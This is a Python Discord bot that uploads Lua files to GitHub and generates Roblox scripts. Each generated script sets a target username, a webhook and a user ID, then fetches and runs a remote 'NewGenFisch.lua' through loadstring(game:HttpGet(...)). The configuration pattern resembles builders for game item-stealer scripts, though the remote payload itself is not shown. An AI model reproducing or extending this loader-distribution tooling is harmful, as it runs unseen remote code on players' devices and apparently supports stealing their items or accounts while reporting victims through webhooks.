
import discord
from discord.ext import commands
from discord import app_commands
import aiohttp
import base64
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
GITHUB_REPO = os.getenv("GITHUB_REPO")
GUILD_ID = int(os.getenv("GUILD_ID"))
REQUIRED_ROLE_ID = 1338832718888173578

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

async def check_permissions(interaction: discord.Interaction) -> bool:
    try:
        if interaction.guild_id != GUILD_ID:
            await interaction.response.send_message("❌ This command can only be used in the designated server.", ephemeral=True)
            return False

        if not interaction.guild:
            await interaction.response.send_message("❌ This command must be used in a server.", ephemeral=True)
            return False

        member = await interaction.guild.fetch_member(interaction.user.id)
        if not any(role.id == REQUIRED_ROLE_ID for role in member.roles):
            await interaction.response.send_message("❌ You do not have permission to use this command.", ephemeral=True)
            return False

        return True
    except Exception as e:
        await interaction.response.send_message(f"❌ Permission check failed: {str(e)}", ephemeral=True)
        return False

@bot.tree.command(name="upload", description="Upload a file to GitHub")
async def upload(interaction: discord.Interaction, file: discord.Attachment):
    if not await check_permissions(interaction):
        return

    await interaction.response.defer(ephemeral=True)

    try:
        if not file.filename.endswith('.lua'):
            await interaction.followup.send("❌ Only .lua files are allowed.", ephemeral=True)
            return

        file_bytes = await file.read()
        encoded_content = base64.b64encode(file_bytes).decode()

        github_url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{file.filename}"
        raw_url = f"https://raw.githubusercontent.com/{GITHUB_REPO}/main/{file.filename}"

        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json"
        }

        data = {
            "message": f"Upload {file.filename}",
            "content": encoded_content
        }

        async with aiohttp.ClientSession() as session:
            async with session.put(github_url, headers=headers, json=data) as response:
                if response.status in [200, 201]:
                    script = f'loadstring(game:HttpGet("{raw_url}"))()'
                    await interaction.followup.send(
                        f"✅ File uploaded successfully!\n```lua\n{script}\n```",
                        ephemeral=True
                    )
                else:
                    result = await response.json()
                    error_msg = result.get("message", "Unknown error")
                    await interaction.followup.send(f"❌ Upload failed: {error_msg}", ephemeral=True)

    except Exception as e:
        await interaction.followup.send(f"❌ An error occurred: {str(e)}", ephemeral=True)

@bot.tree.command(name="create", description="Create a formatted Lua script file")
async def create(interaction: discord.Interaction, username: str, webhook: str, mobile: bool, userid: discord.Member, username2: str = None):
    if not await check_permissions(interaction):
        return

    await interaction.response.defer(ephemeral=True)
    
    try:
        raw_url = "https://raw.githubusercontent.com/YuzhuScripts/Games/main/NewGenFisch.lua"
        
        script_content = f'getgenv().Username = "{username}"\n'
        if username2:
            script_content += f'getgenv().Username2 = "{username2}"\n'
        script_content += f'getgenv().Webhook = "{webhook}"\n'
        script_content += f'getgenv().Mobile = {str(mobile).lower()}\n'
        script_content += f'getgenv().UserId = "{userid.id}"\n\n'
        script_content += f'pcall(function() loadstring(game:HttpGet("{raw_url}"))() end)'

        filename = f"{username}_script.lua"
        with open(filename, "w", encoding="utf-8") as file:
            file.write(script_content)

        await interaction.followup.send(
            "✅ Here is your generated Lua script:", 
            file=discord.File(filename),
            ephemeral=True
        )

        os.remove(filename)
    except Exception as e:
        await interaction.followup.send(f"❌ An error occurred: {str(e)}", ephemeral=True)

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"Bot is ready and logged in as {bot.user}")

from keep_alive import keep_alive
keep_alive()
bot.run(TOKEN)
